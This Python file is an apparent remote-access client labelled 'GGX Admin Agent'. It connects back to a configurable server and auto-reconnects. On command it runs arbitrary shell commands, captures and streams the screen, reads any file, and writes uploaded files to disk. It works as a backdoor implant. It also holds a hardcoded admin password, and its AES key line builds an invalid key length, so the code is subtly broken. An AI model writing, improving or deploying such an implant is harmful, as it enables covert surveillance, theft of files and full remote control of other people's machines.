#!/usr/bin/env python3
# client.py
# GGX Admin Agent (client)
# Branding: "All rights reserved GGX 2025-2026"

import socket, time, json, os, sys, base64, threading, platform, subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# optional screenshot libs
try:
    import mss
    from PIL import Image
    PIL_AVAILABLE = True
except Exception:
    PIL_AVAILABLE = False

# -------- CONFIG (edit BEFORE use) ----------
SERVER_HOST = "127.0.0.1"   # server IP
SERVER_PORT = 2345
KEY = b'af031ea9fa98814bf79716597a8dceb19113b859897836200b686dd169925d22' * 32          # 32 byte key - REPLACE with secure value
ADMIN_PASSWORD = "Saver23"
RECONNECT_DELAY = 5
STREAM_INTERVAL = 0.8
# --------------------------------------------

def send_msg(sock, payload: bytes):
    ln = len(payload).to_bytes(4, 'big')
    sock.sendall(ln + payload)

def recv_msg(sock):
    header = recv_all(sock, 4)
    if not header:
        return None
    ln = int.from_bytes(header, 'big')
    return recv_all(sock, ln)

def recv_all(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def encrypt(plaintext: bytes) -> bytes:
    nonce = get_random_bytes(12)
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(plaintext)
    return nonce + tag + ct

def decrypt(payload: bytes) -> bytes:
    if len(payload) < 28:
        raise ValueError("Invalid payload")
    nonce = payload[:12]; tag = payload[12:28]; ct = payload[28:]
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag)

def send_encrypted(sock, data: bytes):
    send_msg(sock, encrypt(data))

def recv_encrypted(sock):
    raw = recv_msg(sock)
    if raw is None:
        return None
    try:
        return decrypt(raw)
    except Exception:
        return None

# system info
def system_info():
    try:
        import psutil
    except Exception:
        return {"error": "psutil missing"}
    info = {
        "hostname": platform.node(),
        "platform": platform.platform(),
        "python": platform.python_version(),
    }
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory()._asdict()
        disk = {p.mountpoint: psutil.disk_usage(p.mountpoint)._asdict() for p in psutil.disk_partitions()}
        info.update({"cpu_percent": cpu, "mem": mem, "disk": disk})
    except Exception as e:
        info["sys_error"] = str(e)
    return info

# screenshot capture
def capture_screenshot_bytes(quality=60, scale=0.6):
    if not PIL_AVAILABLE:
        raise RuntimeError("Screenshot libs missing")
    with mss.mss() as s:
        monitor = s.monitors[1]
        img = s.grab(monitor)
        pil = Image.frombytes("RGB", img.size, img.rgb)
        if scale != 1.0:
            new_size = (int(pil.width * scale), int(pil.height * scale))
            pil = pil.resize(new_size, Image.LANCZOS)
        from io import BytesIO
        buf = BytesIO()
        pil.save(buf, format="JPEG", quality=quality)
        return buf.getvalue()

stream_flag = threading.Event()

def handle_command(cmd_obj, sock):
    cmd = cmd_obj.get("cmd")
    args = cmd_obj.get("args", [])
    if cmd == "sysinfo":
        return json.dumps(system_info()).encode()
    if cmd == "screenshot":
        try:
            data = capture_screenshot_bytes()
            return b"IMG:" + base64.b64encode(data)
        except Exception as e:
            return f"ERROR: screenshot failed: {e}".encode()
    if cmd == "start_stream":
        if not PIL_AVAILABLE:
            return b"ERROR: streaming not available"
        if stream_flag.is_set():
            return b"STREAM_ALREADY"
        stream_flag.set()
        t = threading.Thread(target=stream_loop, args=(sock,), daemon=True)
        t.start()
        return b"STREAM_STARTED"
    if cmd == "stop_stream":
        stream_flag.clear()
        return b"STREAM_STOPPED"
    if cmd == "exec":
        if not args:
            return b"ERROR: missing command"
        try:
            out = subprocess.check_output(" ".join(args), shell=True, stderr=subprocess.STDOUT, timeout=60)
            return out
        except subprocess.CalledProcessError as e:
            return e.output + f"\n(Exit {e.returncode})".encode()
        except Exception as e:
            return f"ERROR: {e}".encode()
    if cmd == "quit":
        pw = cmd_obj.get("pw", "")
        if pw == ADMIN_PASSWORD:
            send_encrypted(sock, b"Agent shutting down (authorized).")
            sock.close()
            sys.exit(0)
        return b"ERROR: invalid admin password"
    if cmd == "listdir":
        path = args[0] if args else "."
        try:
            entries = os.listdir(path)
            return json.dumps({"path": path, "entries": entries}).encode()
        except Exception as e:
            return f"ERROR: {e}".encode()
    if cmd == "readfile":
        if not args:
            return b"ERROR: missing path"
        path = args[0]
        try:
            with open(path, "rb") as f:
                data = f.read()
            return b"FILE:" + base64.b64encode(data)
        except Exception as e:
            return f"ERROR: {e}".encode()
    if cmd == "upload":
        payload = recv_encrypted(sock)
        if payload is None:
            return b"ERROR: no upload payload"
        try:
            j = json.loads(payload.decode())
            p = j["path"]; b64 = j["base64"]
            with open(p, "wb") as f:
                f.write(base64.b64decode(b64))
            return f"UPLOAD_OK:{p}".encode()
        except Exception as e:
            return f"ERROR: {e}".encode()
    return b"ERROR: unknown command"

def stream_loop(sock):
    try:
        while stream_flag.is_set():
            try:
                img = capture_screenshot_bytes(quality=45, scale=0.45)
            except Exception:
                stream_flag.clear()
                break
            payload = b"IMG:" + base64.b64encode(img)
            try:
                send_encrypted(sock, payload)
            except Exception:
                stream_flag.clear()
                break
            time.sleep(STREAM_INTERVAL)
    finally:
        stream_flag.clear()

def run_client_loop():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(20)
            s.connect((SERVER_HOST, SERVER_PORT))
            s.settimeout(None)
            hello = {"type":"hello", "hostname": platform.node(), "platform": platform.platform()}
            send_encrypted(s, json.dumps(hello).encode())
            while True:
                data = recv_encrypted(s)
                if data is None:
                    break
                try:
                    cmd_obj = json.loads(data.decode())
                except Exception:
                    send_encrypted(s, b"ERROR: invalid command format")
                    continue
                resp = handle_command(cmd_obj, s)
                if isinstance(resp, str):
                    resp = resp.encode()
                send_encrypted(s, resp)
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    run_client_loop()
